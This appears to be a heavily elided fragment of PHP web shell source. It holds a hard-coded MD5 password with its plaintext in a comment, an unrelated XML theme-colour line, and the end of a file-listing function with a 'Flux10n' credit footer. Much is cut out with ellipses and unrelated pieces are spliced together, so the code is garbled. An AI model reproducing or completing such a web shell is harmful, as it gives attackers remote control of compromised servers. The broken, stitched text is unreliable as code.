...
$password = "cda2c99fbf5e19f20d331299c15a4491"; # md5: indonesia
...
<Variable name="themeColor" description="Address bar color" type="color" default="blue" value="blue"/></Group>
...
function files_and_folder() {
	...
	print "</table>";
	print "<br><center><div class='footer'>Copyright &copy; ".date("Y")." - <a href='https://github.com/flux10n' target='_blank'>".color(1, 2, "Flux10n")."</a></center>";
}
